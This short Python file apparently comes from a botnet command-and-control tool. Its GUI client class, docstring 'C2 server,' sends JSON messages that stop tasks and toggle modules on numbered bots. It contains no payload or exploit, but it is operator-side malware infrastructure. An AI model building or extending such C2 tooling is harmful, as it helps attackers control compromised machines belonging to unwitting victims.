from qtpy.QtCore import Slot

from QtPyNetwork.client import QThreadedClient


class GUIClient(QThreadedClient):
    """C2 server."""

    def __init__(self):
        super(GUIClient, self).__init__(loggerName=self.__class__.__name__)

    @Slot(int, int)
    def stop_task(self, bot_id, task_id):
        self.write({"event_type": "task",
                    "bot_id": bot_id,
                    "task_id": task_id,
                    "event": "stop"})

    @Slot(int, str, bool)
    def toggle_module(self, bot_id, module_name, state):
        self.write({"event_type": "module",
                    "bot_id": bot_id,
                    "module": module_name,
                    "state": state})
